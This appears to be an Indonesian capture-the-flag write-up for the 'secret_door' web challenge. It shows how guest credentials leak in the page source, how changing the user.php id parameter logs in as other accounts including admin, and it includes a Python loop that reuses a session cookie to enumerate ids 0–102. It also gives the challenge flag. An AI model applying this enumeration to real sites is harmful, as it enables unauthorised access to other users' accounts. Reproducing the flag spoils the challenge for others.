# secret\_door

### Deskripsi

> Jono adalah seorang chef terkenal dengan keahlian kuliner yang luar biasa. Ia memiliki restoran private cloud kitchen mewah yang dikenal oleh orang tertentu. Namun, ia selalu menganggap sepele akan hal kecil.
>
> Akibat dari kecerobohan Jono, beredar rumor tentang resep rahasia yang Jono simpan di websitenya...
>
> Format Flag : TechnoFairCTF{}
>
> Author : Levin#1583
>
> http://103.152.242.197:29807

Diberikan website seperti berikut. Dengan melakukan inspect, didapat credential untuk username `guest` dengan password `testing`.

<figure><img src="https://lh7-us.googleusercontent.com/docsz/AD_4nXfY1hwJz2WuH9XME4DidYWZQmpriEFliVo8LnFjF-u8Mr0oh5IZfwAHoyID_bbNJ7oyKk2j_HUQJoLDEQlmwrdd5p79SLdQNrEmkrme8wtDg_UQy3BE50JnVS-dyE3B0nKAI1-sFKf9TdMyTQdPgiMy2fYT?key=333lMTjMGqSKL9lWA9A1kw" alt=""><figcaption></figcaption></figure>

Setelah masuk, saya menyadari adanya pola pada URL. Apabila id diubah menjadi `1`, kita akan ter-login sebagai admin. Apabila angka lain, maka sebagai akun lain. Jumlah maksimal id yang tersedia adalah `102`.

<figure><img src="https://lh7-us.googleusercontent.com/docsz/AD_4nXfkHrY4NIDZCMAW75Nn8nd-PNO2z_cXDDLM8Mzksb8ADjAYxN_VXxNg6VcZuB1zxgVzAPf1OrZQY52_PDiF4xTO_w40zZ1R8cHyZJJ0Zq_QLTGYnkuJKDTYh-CKuZAe5k3YHmP1KlzQmnJOco2Bu8aRlgdv?key=333lMTjMGqSKL9lWA9A1kw" alt=""><figcaption></figcaption></figure>

<figure><img src="https://lh7-us.googleusercontent.com/docsz/AD_4nXc6ABBgNxWt-P4XKmOniL0q8A-rmX-F0z0VjM-jNzwQwiQ8AMSkWU1KR3eOmtosf6E4yWTAgtV3KSCvqlmg8YLGbQSti284zBlw5gb3J6KSFDsY92NbKcv_pT_3lv--5ye7uxkBFCTi_s58fmJQLuIfr8E0?key=333lMTjMGqSKL9lWA9A1kw" alt=""><figcaption></figcaption></figure>

<figure><img src="https://lh7-us.googleusercontent.com/docsz/AD_4nXcyvwoDklrv57ZwzyRGJ7DpF30FJviBiBehww6HjBZHGGPYpd3plwCPPdzh7CiPbx3nkSkRDnlLkNwUauz59bLCu9Yfu9MB8bR-ZvgGZiI4emKaYcZarpc4B_BEG9Y8hquLSlbyo53wRRmtzI_JXOXiP8Sz?key=333lMTjMGqSKL9lWA9A1kw" alt=""><figcaption></figcaption></figure>

<figure><img src="https://lh7-us.googleusercontent.com/docsz/AD_4nXfuFNCI6wLWbW-SR76Wz_HsrYjMHlTSoT3r4xG-2q_rqWGCS_iSM9Sr5fGSaVKi7EMyCc_Y_XhTzCtftFmi-gjwHxoRScuwXTMx_TbbZfOFneGeCNdwJYzqb2lSSQoYntQkwO1eKC2YGIc-r2Qdr5hgwozZ?key=333lMTjMGqSKL9lWA9A1kw" alt=""><figcaption></figcaption></figure>

Setiap akun diberikan sebuah string random. Saya berasumsi bahwa flag terdapat pada salah satu id tersebut. Oleh karena itu dapat dilakukan  scripting untuk mengeceknya satu persatu. Saya merujuk pada write-up berikut: [https://cyb3rwhitesnake.medium.com/picoctf-cookies-web-39d8fedd345f](https://cyb3rwhitesnake.medium.com/picoctf-cookies-web-39d8fedd345f).

Namun sebelum melakukan scripting, kita ambil dulu cookies-nya agar tetap ter-login dalam website. Untuk itu saya menggunakan `BurpSuite`.

<figure><img src="https://lh7-us.googleusercontent.com/docsz/AD_4nXcrIo5UV7FhBJWF6K0IfPAQoHkeZ09fPIkBs86BHfNkrdRgjB2t1J6FIMOtv2gBbL3oNmRGUZGgax0XevwqrWWAezy6OvaD0FA59bfpbQwyXShakob2ZqDGTvuuMhoySRwKmNdtBAY1g05qwoEUh_epn1-B?key=333lMTjMGqSKL9lWA9A1kw" alt=""><figcaption></figcaption></figure>

```python
import requests

for i in range(103):
    cookie = 'PHPSESSID=2e1cf1248dd195035bada822964840e9'
    headers = {'Cookie':cookie}
    
    print(i)
    r = requests.get(f'http://103.152.242.197:29807/user.php?id={i}', headers=headers)
    print(r.text[100:120])

    if (r.status_code == 200) and ('Flag' in r.text):
        print(r.text)
```

Flag berada pada id ke-46 dan ke-71.

<figure><img src="https://lh7-us.googleusercontent.com/docsz/AD_4nXcA5VB-jI7ZQBbq5Q6E4UZCQ1AkZFigNCiYgg9u3cyK8VJ2YBjCHNHFk0TX4ryPvmtlnEg2as7QHwNDP4gJSlIVJT_Js-UguxxDkL234qfpJFglDzFj-SmZlMFVeQsMuAYIcCe-tMeCALq07SzcswWsIgw?key=333lMTjMGqSKL9lWA9A1kw" alt=""><figcaption></figcaption></figure>

<figure><img src="https://lh7-us.googleusercontent.com/docsz/AD_4nXc5-0g9Hlb97bMbizsjD0ES4hfWi_2zVfESi-shSlU90b7pn_q2xZ2s8cy1eajjKW6GVcbIbp087R_3B4z_RHozL1_v8CIfq672ZeGETtxjKuIuTVkW9oYqdcuxi2Pw7HrJCnrwvS1LDoy-ln0T88T2Tatx?key=333lMTjMGqSKL9lWA9A1kw" alt=""><figcaption></figcaption></figure>

Flag: `TechnoFairCTF{Sp1cy_P3pp3r_4nd_G4rlic_Sauce}`
